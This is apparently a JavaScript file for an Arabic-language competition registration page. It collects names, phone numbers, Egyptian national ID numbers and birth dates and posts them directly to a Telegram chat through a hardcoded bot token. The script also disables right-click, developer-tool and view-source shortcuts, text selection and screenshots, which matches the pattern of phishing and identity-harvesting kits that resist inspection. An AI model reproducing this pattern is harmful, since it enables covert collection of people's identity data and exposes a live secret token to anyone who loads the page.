const TELEGRAM_BOT_TOKEN = '8894749570:AAEqQdN4vsr-7wynH2baT-p9xTeDpwTM8dM';
const TELEGRAM_CHAT_IDS = ['-1003945138858'];

const monthsAr = [
  'يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو',
  'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'
];

function fillDateSelects() {
  const daySel = document.getElementById('birthDay');
  const monthSel = document.getElementById('birthMonth');
  const yearSel = document.getElementById('birthYear');

  for (let d = 1; d <= 31; d++) {
    const opt = document.createElement('option');
    opt.value = String(d).padStart(2, '0');
    opt.textContent = d;
    daySel.appendChild(opt);
  }

  monthsAr.forEach((name, i) => {
    const opt = document.createElement('option');
    opt.value = String(i + 1).padStart(2, '0');
    opt.textContent = name;
    monthSel.appendChild(opt);
  });

  const currentYear = new Date().getFullYear();
  for (let y = currentYear; y >= currentYear - 80; y--) {
    const opt = document.createElement('option');
    opt.value = y;
    opt.textContent = y;
    yearSel.appendChild(opt);
  }
}

fillDateSelects();

document.addEventListener('contextmenu', e => e.preventDefault());

document.addEventListener('keydown', (e) => {
  if (e.key === 'F12') { e.preventDefault(); return false; }
  if (e.ctrlKey && ['u','U','s','S','p','P','c','C'].includes(e.key)) { e.preventDefault(); return false; }
  if (e.ctrlKey && e.shiftKey && ['I','J','C','i','j','c'].includes(e.key)) { e.preventDefault(); return false; }
  if (e.key === 'PrintScreen') { navigator.clipboard.writeText(''); e.preventDefault(); return false; }
});

document.addEventListener('dragstart', e => e.preventDefault());
document.addEventListener('selectstart', e => e.preventDefault());

document.addEventListener('wheel', (e) => {
  if (e.ctrlKey) e.preventDefault();
}, { passive: false });

const form = document.getElementById('regForm');
const successMsg = document.getElementById('successMsg');
const submitBtn = document.querySelector('.submit-btn');

function buildMessage(data) {
  const dateStr = new Date().toLocaleString('ar-EG', {
    day: '2-digit',
    month: 'long',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });

  return `🌟 تسجيل جديد في مسابقة المصباح المنير 🌟

━━━━━━━━━━━━━━━━━━
👤 الاسم:
${data.name}

📱 رقم الموبايل:
${data.phone}

🆔 الرقم القومي:
${data.national_id}

🎓 المستوى:
${data.level}

🎂 تاريخ الميلاد:
${data.birth_date}

⏰ وقت التسجيل:
${dateStr}
━━━━━━━━━━━━━━━━━━

✅ تم التسجيل بنجاح`;
}

async function sendToTelegram(data) {
  const message = buildMessage(data);
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const sends = TELEGRAM_CHAT_IDS.map(chatId =>
    fetch(url, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        disable_web_page_preview: true
      })
    }).catch(e => ({ ok: false, error: String(e) }))
  );

  return Promise.all(sends);
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const day   = document.getElementById('birthDay').value;
  const month = document.getElementById('birthMonth').value;
  const year  = document.getElementById('birthYear').value;

  const data = {
    name:        document.getElementById('name').value.trim(),
    phone:       document.getElementById('phone').value.trim(),
    national_id: document.getElementById('nationalId').value.trim(),
    level:       document.getElementById('level').value,
    birth_date:  (day && month && year) ? `${year}-${month}-${day}` : ''
  };

  if (!data.name || !data.phone || !data.national_id || !data.level || !data.birth_date) {
    alert('من فضلك اكمل جميع البيانات');
    return;
  }

  if (!/^01[0-9]{9}$/.test(data.phone)) {
    alert('رقم الموبايل غير صحيح');
    return;
  }

  if (!/^[0-9]{14}$/.test(data.national_id)) {
    alert('الرقم القومي يجب أن يكون 14 رقم');
    return;
  }

  submitBtn.disabled = true;
  submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري التسجيل...';

  try {
    await sendToTelegram(data);

    form.reset();
    successMsg.style.display = 'block';
    submitBtn.innerHTML = '<span class="btn-text">سجّل الآن</span><i class="fa-solid fa-arrow-left"></i>';
    submitBtn.disabled = false;

    setTimeout(() => { successMsg.style.display = 'none'; }, 6000);
    successMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });

  } catch (err) {
    console.error(err);
    alert('حصل خطأ، حاول تاني');
    submitBtn.disabled = false;
    submitBtn.innerHTML = '<span class="btn-text">سجّل الآن</span><i class="fa-solid fa-arrow-left"></i>';
  }
});